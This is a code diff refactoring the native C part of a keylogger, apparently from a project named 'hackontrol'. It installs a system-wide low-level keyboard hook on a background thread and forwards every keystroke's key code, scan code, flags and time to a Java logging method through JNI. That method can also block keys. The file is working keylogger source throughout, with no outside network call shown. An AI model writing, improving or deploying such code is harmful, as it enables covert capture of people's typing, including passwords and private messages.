@@ -1,37 +1,35 @@
-#include <Windows.h>
 #include <khopanjni.h>
 #include <khopanerror.h>
 #include "keylogger.h"
 
-JavaVM* globalVirtualMachine;
-jclass globalNativeLibraryClass;
-jmethodID globalLogMethod;
-JNIEnv* globalEnvironment;
+static JavaVM* globalVirtualMachine;
+static JNIEnv* globalEnvironment;
+static jclass globalNativeLibraryClass;
+static jmethodID globalLogMethod;
 
-DWORD WINAPI KeyLoggerThread(_In_ LPVOID);
-LRESULT CALLBACK KeyLoggerProcedure(_In_ int, _In_ WPARAM, _In_ LPARAM);
+static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter);
+static LRESULT CALLBACK KeyLoggerProcedure(_In_ int, _In_ WPARAM wparam, _In_ LPARAM lparam);
 
-void startKeyLogger(JNIEnv* environment, JavaVM* virtualMachine) {
+void KeyLoggerInitialize(JNIEnv* environment, JavaVM* virtualMachine) {
 	globalVirtualMachine = virtualMachine;
-	DWORD identifier = 0;
-	HANDLE thread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, &identifier);
 
-	if(!thread) {
+	if(!CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL)) {
 		KHWin32ErrorW(environment, GetLastError(), L"CreateThread");
 	}
 }
 
-DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
-	JNIEnv* environment;
-	JavaVMAttachArgs arguments;
+static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
+	JavaVMAttachArgs arguments = {0};
 	arguments.version = JNI_VERSION_21;
 	arguments.name = NULL;
 	arguments.group = NULL;
+	JNIEnv* environment = NULL;
 	
 	if((*globalVirtualMachine)->AttachCurrentThread(globalVirtualMachine, (void**) &environment, &arguments)) {
 		return 1;
 	}
-	
+
+	globalEnvironment = environment;
 	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");
 
 	if(!nativeLibraryClass) {
@@ -39,6 +37,7 @@ DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
 		return 1;
 	}
 
+	globalNativeLibraryClass = nativeLibraryClass;
 	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, nativeLibraryClass, "log", "(IIIII)Z");
 	
 	if(!logMethod) {
@@ -46,16 +45,14 @@ DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
 		return 1;
 	}
 
-	globalNativeLibraryClass = nativeLibraryClass;
 	globalLogMethod = logMethod;
-	globalEnvironment = environment;
 	
 	if(!SetWindowsHookExW(WH_KEYBOARD_LL, KeyLoggerProcedure, NULL, 0)) {
 		KHWin32ErrorW(environment, GetLastError(), L"SetWindowsHookExW");
 		return 1;
 	}
 	
-	MSG message;
+	MSG message = {0};
 
 	while(GetMessageW(&message, NULL, 0, 0)) {
 		TranslateMessage(&message);
@@ -65,17 +62,11 @@ DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
 	return 0;
 }
 
-LRESULT CALLBACK KeyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
+static LRESULT CALLBACK KeyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
 	if(code != HC_ACTION) {
 		return CallNextHookEx(NULL, code, wparam, lparam);
 	}
 
 	PKBDLLHOOKSTRUCT keyboard = (PKBDLLHOOKSTRUCT) lparam;
-	jint keyAction = (jint) wparam;
-	jint keyCode = (jint) keyboard->vkCode;
-	jint scanCode = (jint) keyboard->scanCode;
-	jint flags = (jint) keyboard->flags;
-	jint time = (jint) keyboard->time;
-	jboolean result = (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalNativeLibraryClass, globalLogMethod, keyAction, keyCode, scanCode, flags, time);
-	return result ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
+	return (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalNativeLibraryClass, globalLogMethod, (jint) wparam, (jint) keyboard->vkCode, (jint) keyboard->scanCode, (jint) keyboard->flags, (jint) keyboard->time) ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
 }
